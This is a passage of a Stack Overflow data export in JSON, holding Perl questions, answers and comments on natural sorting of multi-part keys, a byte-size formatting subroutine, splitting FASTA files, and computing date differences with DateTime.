'more',\n);\n\nsay for natsort keys %data;\n</code></pre>\n\n<p>Outputs:</p>\n\n<pre><code>1,1,1\n1,1,3\n1,2\n2,1,1\n2,1,2\n2,1,3\n2,2,2\n10,1,2\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 4, "last_activity_date": 1467562947, "last_edit_date": 1467562947, "creation_date": 1462830598, "answer_id": 37126035, "question_id": 37125529, "link": "https://stackoverflow.com/questions/37125529/recursive-sorting-in-perl/37126035#37126035", "title": "Recursive sorting in Perl", "body": "<p><strike>I thought the <a href=\"https://metacpan.org/pod/Sort::Naturally\" rel=\"nofollow\"><code>Sort::Naturally</code></a> module would help you here, but it seems not</strike></p>\n\n<p>I must have had a bug in my test. This works fine</p>\n\n<pre><code>use Sort::Naturally 'nsort';\nsay for nsort keys %$data;\n</code></pre>\n\n<p>I recommend either this or the <code>Sort::Key::Naturally</code> solution as they are the clearest</p>\n\n<p>It is bad practice to chase speed of execution, especially at the expense of readability, before there is evidence that a given solution is too slow. Even then it is foolish to randomly optimise chunks of your code in the hope of making a difference, and your solution should be run through a profiler to discover where it would be most fruitful to make enhancements</p>\n\n<p><br/></p>\n\n<hr>\n\n<p>There is no need for recursion. This program shows a sort subroutine <code>by_elements</code> which simply compares each item in the list until it finds either a mismatch or the end of one of the lists</p>\n\n<p>In the former case the result is just the comparison of the two differ elements, and in the latter it is a comparison of the <em>number of elements</em> in the two lists</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nmy $data = {\n    '1,1,1'  =&gt; 'data1',\n    '1,2'    =&gt; 'data2',\n    '1,1,3'  =&gt; 'stuff',\n    '2,1,1'  =&gt; 'data3',\n    '2,1,2'  =&gt; 'data4',\n    '2,1,3'  =&gt; 'data blah',\n    '2,2,2'  =&gt; 'datawk2n',\n    '3,1,2'  =&gt; 'more',\n    '10,1,1' =&gt; 'odd',\n    '1,1'    =&gt; 'simple',\n    '1,0'    =&gt; 'simple0',\n    '1'      =&gt; 'simpler',\n};\n\nsay for sort by_elements keys %$data;\n\nsub by_elements {\n    my ( $aa, $bb ) = map [/\\d+/g], $a, $b;\n    for ( my $i = 0; $i &lt; @$aa and $i &lt; @$bb; ++$i ) {\n        my $cmp = $aa-&gt;[$i] &lt;=&gt; $bb-&gt;[$i];\n        return $cmp if $cmp;\n    }\n    return @$aa &lt;=&gt; @$bb;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>1\n1,0\n1,1\n1,1,1\n1,1,3\n1,2\n2,1,1\n2,1,2\n2,1,3\n2,2,2\n3,1,2\n10,1,1\n</code></pre>\n"}], "owner": {"reputation": 7704, "user_id": 3964397, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/640272a326ae5f3cd89364b78f2108c9?s=128&d=identicon&r=PG", "display_name": "tjwrona1992", "link": "https://stackoverflow.com/users/3964397/tjwrona1992"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 288, "favorite_count": 2, "accepted_answer_id": 37125904, "answer_count": 4, "score": 8, "last_activity_date": 1467562947, "creation_date": 1462828230, "question_id": 37125529, "link": "https://stackoverflow.com/questions/37125529/recursive-sorting-in-perl", "title": "Recursive sorting in Perl", "body": "<p>I have a hash that contains keys that correspond to database subscripts, but the database can have multidimensional records so the key could be a single subscript, or a list of subscripts.</p>\n\n<p>I need to find a way to sort these records so I can print them in a logical order.</p>\n\n<p>Example:</p>\n\n<pre><code>my $data = {\n    '1,1,1' =&gt; 'data1',\n    '1,2'   =&gt; 'data2',\n    '1,1,3' =&gt; 'stuff',\n    '2,1,1' =&gt; 'data3',\n    '2,1,2' =&gt; 'data4',\n    '2,1,3' =&gt; 'data blah',\n    '2,2,2' =&gt; 'datawk2n',\n    '3,1,2' =&gt; 'more',\n};\n\n# Should print the keys in the properly sorted order\nprint join \"\\n\", sort some_function keys %$data;\n\nsub some_function {\n    # Do some sorting magikz\n}\n</code></pre>\n\n<p>I want it to sort by the leftmost subscript first.  If the leftmost value is identical I want to move to the next value and compare those.  If those are identical I want to continue to the next one ... and so on ... until all possibilities are exhausted.</p>\n\n<p>This will most likely involve some recursion, but I can't figure out how to make recursion work with those fancy <code>$a</code> and <code>$b</code> variables.</p>\n\n<p>What can I put in <code>some_function</code> to get the following output?</p>\n\n<pre><code>1,1,1\n1,1,3\n1,2\n2,1,1\n2,1,2\n2,1,3\n2,2,2\n3,1,2\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 6, "creation_date": 1462823015, "post_id": 37124052, "comment_id": 61789156, "body": "That is a really bad way to write that (especially in the original version where it was all on one line). No wonder you&#39;re confused!"}, {"owner": {"reputation": 23906, "user_id": 459233, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/23bfb69cb2c8a6a028d2376b12db4a73?s=128&d=identicon&r=PG", "display_name": "Tudor Constantin", "link": "https://stackoverflow.com/users/459233/tudor-constantin"}, "edited": false, "score": 0, "creation_date": 1462823396, "post_id": 37124052, "comment_id": 61789361, "body": "I guess somebody tried to look <i>smart</i> with this code."}], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462823087, "post_id": 37124168, "comment_id": 61789196, "body": "Oddly - this might be <i>better</i> using a hash to look up the exponent than a list of anon arrays."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462833078, "post_id": 37124168, "comment_id": 61793656, "body": "@Sobrique: The author has used a <i>[ suffix =&gt; exponent ]</i> order solely so that they can use the <code>=&gt;</code> operator. The more natural representation is <i>[exponent =&gt; suffix]</i>, which leaves us with <code>[0, &#39; bytes&#39;], [1, &#39;KB&#39;], [2, &#39;MB&#39;], [3, &#39;GB&#39;]</code> and that looks a <i>lot</i> like an array <code>[ &#39; bytes&#39;, &#39;KB&#39;, &#39;MB&#39;, &#39;GB&#39; ]</code> which I am certain would be faster than any hash. What we need now is for Perl to allow a <code>state</code> array to be initialised with a list"}], "tags": [], "owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "is_accepted": false, "score": 1, "last_activity_date": 1462823345, "last_edit_date": 1462823345, "creation_date": 1462823026, "answer_id": 37124168, "question_id": 37124052, "link": "https://stackoverflow.com/questions/37124052/explain-perl-code-to-display-a-number-of-bytes-in-kb-mb-gb-etc/37124168#37124168", "title": "Explain Perl code to display a number of bytes in KB, MB, GB etc", "body": "<p>No, it is not being passed an array of hashes.  It is being passed a list of array references, where each referenced array contains exactly two elements.</p>\n\n<p>The <code>=&gt;</code> operator in Perl is also known as the \"fat comma\" operator. It is identical to the <code>,</code> operator except that it automatically quotes the left hand argument.  It is most commonly used with hashes and hash references, because keys are so often strings and it's useful to have a visual indication that the key and value are linked in some way, but it is not a requirement.  </p>\n\n<p><code>[\" bytes\"=&gt;0],[KB=&gt;1],[MB=&gt;2],[GB=&gt;3]</code></p>\n\n<p>is exactly the same as</p>\n\n<p><code>[\" bytes\", 0],['KB', 1],['MB', 2],['GB', 3]</code></p>\n\n<p>Simply using the <code>=&gt;</code> instead of <code>,</code> operator does not make a two-element array into a hash.  If you wanted to pass <code>map</code> a list of hash references, you'd have to change all the <code>[ ]</code> to <code>{ }</code></p>\n\n<p><code>{\" bytes\"=&gt;0},{KB=&gt;1},{MB=&gt;2},{GB=&gt;3}</code></p>\n\n<p><a href=\"http://perldoc.perl.org/perlop.html#Comma-Operator\" rel=\"nofollow\">More info on the fat comma operator</a></p>\n\n<p><a href=\"http://perldoc.perl.org/perlref.html\" rel=\"nofollow\">More info on Perl references</a></p>\n"}, {"tags": [], "owner": {"reputation": 23906, "user_id": 459233, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/23bfb69cb2c8a6a028d2376b12db4a73?s=128&d=identicon&r=PG", "display_name": "Tudor Constantin", "link": "https://stackoverflow.com/users/459233/tudor-constantin"}, "is_accepted": false, "score": 0, "last_activity_date": 1462823072, "creation_date": 1462823072, "answer_id": 37124186, "question_id": 37124052, "link": "https://stackoverflow.com/questions/37124052/explain-perl-code-to-display-a-number-of-bytes-in-kb-mb-gb-etc/37124186#37124186", "title": "Explain Perl code to display a number of bytes in KB, MB, GB etc", "body": "<pre><code>map { sprintf '%.3g%s', $bytes/1024**$_-&gt;[1], $_-&gt;[0] } [\" bytes\"=&gt;0],[KB=&gt;1],[MB=&gt;2],[GB=&gt;3]\n</code></pre>\n\n<p>the above part returns a list of strings formatted with that <code>sprintf()</code>.</p>\n\n<p><code>$_-&gt;[1]</code> represents the number from the right of \" bytes\", KB, MB, etc, while <code>$_-&gt;[0]</code> represents the \" bytes\", KB, MB, etc string</p>\n\n<p>The whole function returns the string that has the biggest length among all the ones formatted with that <code>sprintf()</code>. </p>\n"}, {"comments": [{"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 2, "creation_date": 1462824054, "post_id": 37124341, "comment_id": 61789740, "body": "Note that this doesn&#39;t do the same thing the original code does (although, it&#39;s arguably more sensible).  Because the original is returning the value that has the shortest string length, an input of 100 would return &quot;0.0977KB&quot; rather than &quot;100 bytes&quot; (8 characters rather than 9)."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 2, "creation_date": 1462825289, "post_id": 37124341, "comment_id": 61790351, "body": "@PaulL: Hah! I hadn&#39;t spotted that. Not so clever as they thought, perhaps"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 3, "last_activity_date": 1462823597, "creation_date": 1462823597, "answer_id": 37124341, "question_id": 37124052, "link": "https://stackoverflow.com/questions/37124052/explain-perl-code-to-display-a-number-of-bytes-in-kb-mb-gb-etc/37124341#37124341", "title": "Explain Perl code to display a number of bytes in KB, MB, GB etc", "body": "<p>\"No, those aren't hashes. </p>\n\n<pre><code>[\" bytes\"=&gt;0],[KB=&gt;1],[MB=&gt;2],[GB=&gt;3]\n</code></pre>\n\n<p>Isn't a hash at all. <code>=&gt;</code> is basically just a comma. So this is </p>\n\n<pre><code>[\" bytes\", 0],[\"KB\",1],[\"MB\",2],[\"GB\",3]\n</code></pre>\n\n<p>Which is a bit of an odd way of doing it, because it's sort of constructing a hash. </p>\n\n<p>So I'd write this more like:</p>\n\n<pre><code>sub fmt2 {\n   my ($bytes) = @_;\n   my @units = qw ( bytes KB MB GB TB );\n   #divide by 1024 whilst above\n   while ( $bytes &gt; 1024 ) {\n      shift(@units); #drop one of the units prefixes until one 'fits'. \n      $bytes /= 1024;\n   }\n   return sprintf( '%.3g%s', $bytes, $units[0] );\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 7, "last_activity_date": 1467554704, "last_edit_date": 1467554704, "creation_date": 1462823907, "answer_id": 37124414, "question_id": 37124052, "link": "https://stackoverflow.com/questions/37124052/explain-perl-code-to-display-a-number-of-bytes-in-kb-mb-gb-etc/37124414#37124414", "title": "Explain Perl code to display a number of bytes in KB, MB, GB etc", "body": "<p>That is one awful piece of code. Someone's showing off</p>\n\n<p>The list passed to <code>map</code> is this: a list of anonymous arrays</p>\n\n<pre><code>[ \" bytes\" =&gt; 0 ], [ KB =&gt; 1 ], [ MB =&gt; 2 ], [ GB =&gt; 3 ]\n</code></pre>\n\n<p>While the <em>fat comma</em> operator <code>=&gt;</code> is often seen in the context of a hash literal, that's not all it's good for. It's <em>identical</em> to an ordinary comma <code>,</code> except that a <em>bareword</em> left-hand operand will be implicitly quoted. Without it the list would be the same as </p>\n\n<pre><code>[ ' bytes', 0 ], [ 'KB', 1 ], [ 'MB', 2 ], [ 'GB', 3 ]\n</code></pre>\n\n<p>Here's the same function with the result of the intermediate <code>map</code> statement expanded into a separate array <code>@variations</code>, which I dump using <code>Data::Dump</code> to show what it's doing</p>\n\n<p>The list passed to <code>map</code> is a number of anonymous arrays--each one containing the suffix string and the corresponding power of 1024 to which that string corresponds. The <code>return</code> statement simply picks the shortest of the representations</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse Data::Dump;\n\nsay fmt(987 * 1024**2);\n\nsub fmt {\n        my $bytes = shift;\n\n        my @variations = map { sprintf '%.3g%s', $bytes/1024 ** $_-&gt;[1], $_-&gt;[0] }\n            [ \" bytes\" =&gt; 0 ],\n            [ KB =&gt; 1 ],\n            [ MB =&gt; 2 ],\n            [ GB =&gt; 3 ];\n\n        dd \\@variations;\n\n        return ( sort { length $a &lt;=&gt; length $b } @variations ) [0];\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>[\"1.03e+009 bytes\", \"1.01e+006KB\", \"987MB\", \"0.964GB\"]\n987MB\n</code></pre>\n\n<p>I normally use something similar to this. The antics with <code>sprintf</code> are to make sure that fractions of a byte are never displayed</p>\n\n<pre><code>sub fmt2 {\n    my ($n) = @_;\n    my @suffix = ( '', qw/ K M G T P E / );\n\n    my $i = 0;\n    until ( $n &lt; 1024 or $i == $#suffix ) {\n        $n /= 1024;\n        ++$i;\n    }\n\n    sprintf $i ? '%.3g%sB' : '%.0f%sB', $n, $suffix[$i];\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4116, "user_id": 4402825, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-3ESJ4SrCVfE/AAAAAAAAAAI/AAAAAAAAFO8/yBWcRYAN94s/photo.jpg?sz=128", "display_name": "Ben Grimm", "link": "https://stackoverflow.com/users/4402825/ben-grimm"}, "is_accepted": false, "score": 4, "last_activity_date": 1462894817, "last_edit_date": 1462894817, "creation_date": 1462855819, "answer_id": 37129497, "question_id": 37124052, "link": "https://stackoverflow.com/questions/37124052/explain-perl-code-to-display-a-number-of-bytes-in-kb-mb-gb-etc/37129497#37129497", "title": "Explain Perl code to display a number of bytes in KB, MB, GB etc", "body": "<p>With a tiny bit of math, this can be done without any iteration or cleverly constructed arrays:</p>\n\n<pre><code>my @si_prefix = ('', qw( K M G T P E Z Y ));\nsub fmt {\n  my $bytes = shift or return '0B';\n  my $pow = int log(abs $bytes)/log(1024);\n  return sprintf('%3.3g%sB', $bytes / (1024 ** $pow), $si_prefix[$pow]);\n}\n</code></pre>\n\n<p><em>We can easily determine the closest power of 1024 by using the logarithm base change rule: log<sub>1024</sub>($bytes) = log($bytes) / log(1024)</em></p>\n\n<p>Just for fun, I ran <code>Benchmark::cmpthese</code> using the code from the question, @Borodin's <code>fmt2</code>, and my version:</p>\n\n<pre><code>Benchmarking 1B\n                 Rate    fmt_orig fmt_borodin         fmt\nfmt_orig     245700/s          --        -76%        -84%\nfmt_borodin 1030928/s        320%          --        -34%\nfmt         1562500/s        536%         52%          --\n\nBenchmarking 7.45GB\n                 Rate    fmt_orig fmt_borodin         fmt\nfmt_orig     224215/s          --        -66%        -84%\nfmt_borodin  653595/s        192%          --        -54%\nfmt         1428571/s        537%        119%          --\n\nBenchmarking 55.5EB\n                 Rate    fmt_orig fmt_borodin         fmt\nfmt_orig     207469/s          --        -57%        -83%\nfmt_borodin  487805/s        135%          --        -60%\nfmt         1219512/s        488%        150%          --\n</code></pre>\n"}], "owner": {"reputation": 1075, "user_id": 740521, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e724ef960b60005ddfdf845d82e358de?s=128&d=identicon&r=PG", "display_name": "user740521", "link": "https://stackoverflow.com/users/740521/user740521"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 591, "favorite_count": 2, "accepted_answer_id": 37124414, "answer_count": 5, "score": 7, "last_activity_date": 1467554704, "creation_date": 1462822590, "last_edit_date": 1462886435, "question_id": 37124052, "link": "https://stackoverflow.com/questions/37124052/explain-perl-code-to-display-a-number-of-bytes-in-kb-mb-gb-etc", "title": "Explain Perl code to display a number of bytes in KB, MB, GB etc", "body": "<p>Given a number of bytes it formats it into \"bytes\", \"KB\", \"MB\", or \"GB\"... but what I don't understand is the portion:</p>\n\n<pre><code>$_-&gt;[1], $_-&gt;[0]\n</code></pre>\n\n<p>isn't what's being passed to map just an array of hashes? So how can there be a 0 and 1 index?</p>\n\n<pre><code>sub fmt {\n    my $bytes = shift;\n\n    return (\n        sort { length $a &lt;=&gt; length $b                         } \n        map  { sprintf '%.3g%s', $bytes/1024**$_-&gt;[1], $_-&gt;[0] } \n        [\" bytes\"=&gt;0],[KB=&gt;1],[MB=&gt;2],[GB=&gt;3]\n    )[0];\n}\n</code></pre>\n"}, {"tags": ["perl", "task", "fasta"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 6311960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d41b85a819e3edf477963cb8340704c?s=128&d=identicon&r=PG&f=1", "display_name": "benezinho", "link": "https://stackoverflow.com/users/6311960/benezinho"}, "edited": false, "score": 0, "creation_date": 1463167616, "post_id": 37124676, "comment_id": 61966866, "body": "But I need to do this in the script itself"}], "tags": [], "owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "is_accepted": false, "score": 0, "last_activity_date": 1462824913, "creation_date": 1462824913, "answer_id": 37124676, "question_id": 37124005, "link": "https://stackoverflow.com/questions/37124005/how-do-i-generate-one-fasta-file-only-with-the-reference-and-the-virus-name-that/37124676#37124676", "title": "how do I generate one fasta file only with the reference and the virus name that are in the header of a file multifasta in perl", "body": "<p>So basically, you want first line of every <code>*.fa</code> file in a <code>fileReferences.txt</code>? If so, try this:</p>\n\n<pre><code>awk 'FNR==1' *.fa &gt; fileReferences.txt\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6311960, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d41b85a819e3edf477963cb8340704c?s=128&d=identicon&r=PG&f=1", "display_name": "benezinho", "link": "https://stackoverflow.com/users/6311960/benezinho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 42, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462824913, "creation_date": 1462822410, "question_id": 37124005, "link": "https://stackoverflow.com/questions/37124005/how-do-i-generate-one-fasta-file-only-with-the-reference-and-the-virus-name-that", "title": "how do I generate one fasta file only with the reference and the virus name that are in the header of a file multifasta in perl", "body": "<p>I need your help.</p>\n\n<p>I did a perl script that converts multifasta files to fasta file.\nFor Example:</p>\n\n<p>In multi-fasta file contains:</p>\n\n<blockquote>\n  <p>gi|983431797|ref|NZ_LN000000.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 1\n  CTGACTGGGAGTACGAAGGCCGCCTGCACAAGACAACGGGGCAGCGAACCTTCTTCTGCACCGGCACGGA</p>\n  \n  <p>gi|983431797|ref|NZ_LN123456.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 2\n  CTGACTGGGAGTACGAAGGCCGCCTGCACAAGACAACGGGGCAGCGAACCTTCTTCTGCACCGGCACGGA</p>\n  \n  <p>gi|983431797|ref|NZ_LN457532.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 3</p>\n</blockquote>\n\n<p>CTGACTGGGAGTACGAAGGCCGCCTGCACAAGACAACGGGGCAGCGAACCTTCTTCTGCACCGGCACGGA</p>\n\n<p>My script does this:</p>\n\n<p>file1.fa</p>\n\n<blockquote>\n  <p>gi|983431797|ref|NZ_LN000000.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 1\n  CTGACTGGGAGTACGAAGGCCGCCTGCACAAGACAACGGGGCAGCGAACCTTCTTCTGCACCGGCACGGA</p>\n</blockquote>\n\n<p>file2.fa</p>\n\n<blockquote>\n  <p>gi|983431797|ref|NZ_LN123456.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 2\n  CTGACTGGGAGTACGAAGGCCGCCTGCACAAGACAACGGGGCAGCGAACCTTCTTCTGCACCGGCACGGA</p>\n</blockquote>\n\n<p>in different fasta files.</p>\n\n<p>But I need my script to generate a file containing all the references that are in multifasta file.\nFor example:</p>\n\n<p>fileReferences.txt: \nref|NZ_LN000000.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 1\nref|NZ_LN123456.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 2\nref|NZ_LN457532.1| Nocardia farcinica genome assembly NCTC11134, chromosome : 3</p>\n\n<p>Do you understand?</p>\n\n<p>I'm sorry, I'm new in perl language, I did the first script after much research, but I can't finish it. So if anyone can help me, I will be grateful.\nP.S: Forgive my English. ^^</p>\n\n<p>My Script:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\n\nuse warnings;\n\nuse IO::File;\n\nmy $usage = \"\\nUSAGE: perl $0 &lt;Fasta&gt;\".\"\\n\";\n\nprint $usage and exit unless($ARGV[0]);\n\nmy $input  = IO::File-&gt;new(\"$ARGV[0]\");\n\nmy $output = \"\";\n\n\nwhile(my $line = $input-&gt;getline)\n\n{\n\n    chomp($line);\n\n    if($line =~ /^&gt;/)\n\n    {\n\n         if($output ne \"\")\n\n         {\n\n              close ($output);\n\n         }\n\n         $line =~ s/^&gt;//;\n\n         $output  = IO::File-&gt;new(\"&gt; $line.fa\");\n\n         print $output \"&gt;\".$line.\"\\n\";\n\n      }\n\n      else\n\n      {\n\n          print $output $line.\"\\n\";\n\n      }\n\n  }\n\n\nclose ($input);\n\nclose ($output);\n</code></pre>\n"}, {"tags": ["perl", "datetime"], "comments": [{"owner": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 1, "creation_date": 1462819616, "post_id": 37123202, "comment_id": 61787234, "body": "What have you tried so far?  What examples are you looking at and in what way do you judge them unclear?"}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "reply_to_user": {"reputation": 907, "user_id": 6146688, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8f262dda91bdff7ff11cf7762124764d?s=128&d=identicon&r=PG", "display_name": "Paul L", "link": "https://stackoverflow.com/users/6146688/paul-l"}, "edited": false, "score": 0, "creation_date": 1462819807, "post_id": 37123202, "comment_id": 61787327, "body": "One sec.. let me get this format"}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462819871, "post_id": 37123202, "comment_id": 61787359, "body": "I tried this: $x=$dtcurrent-&gt;subtract_datetime_absolute($dt1);  and got an error  DateTime::Duration does not overload comparison.  See the documentation on the compare() method for details."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462819978, "post_id": 37123202, "comment_id": 61787413, "body": "Most of the examples I&#39;ve found online use an outdated Date::Calc module."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1462820033, "post_id": 37123202, "comment_id": 61787458, "body": "Please add this to your question, and show input for which you get errors."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462820245, "post_id": 37123202, "comment_id": 61787579, "body": "Example:       $x=$dtcurrent-&gt;delta_days($dt1);     if ($x&gt;30) ...  it does not appear to be returning a number I can use in a numeric comparison"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462820392, "post_id": 37123202, "comment_id": 61787660, "body": "Please see documentation -- <a href=\"http://search.cpan.org/~drolsky/DateTime-1.26/lib/DateTime.pm#%24dt-%3Edelta_days%28_%24datetime_%29\" rel=\"nofollow noreferrer\">delta_days</a> returns an object."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462820437, "post_id": 37123202, "comment_id": 61787690, "body": "forgive me but I&#39;m not very familiar with OOP.. this is a very old script that was not using any OOP... I just need an integer returned so I can make this old script continue to function properly because the old library upon which it relied is no longer available."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/23e65c9f78e6c567b436bcf6dbfadf02?s=128&d=identicon&r=PG&f=1", "display_name": "Arkan", "link": "https://stackoverflow.com/users/6311434/arkan"}, "edited": false, "score": 0, "creation_date": 1462820522, "post_id": 37123202, "comment_id": 61787738, "body": "What is the proper code to return an integer that represents the difference between two dates using DateTime routines?    I do not know how to handle a DateTime:duration object.   This is why I&#39;m asking."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1462820733, "post_id": 37123202, "comment_id": 61787849, "body": "This now makes far more sense.  Please update the question with all this information -- what you tried and what doesn&#39;t work (and how) or you don&#39;t know how to do.  That&#39;s precisely what should be in the question."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462820814, "post_id": 37123202, "comment_id": 61787897, "body": "See <a href=\"http://stackoverflow.com/a/6550372/5830574\">here</a>."}, {"owner": {"reputation": 29, "user_id": 6311434, "user_type": "registered", "profile_image": 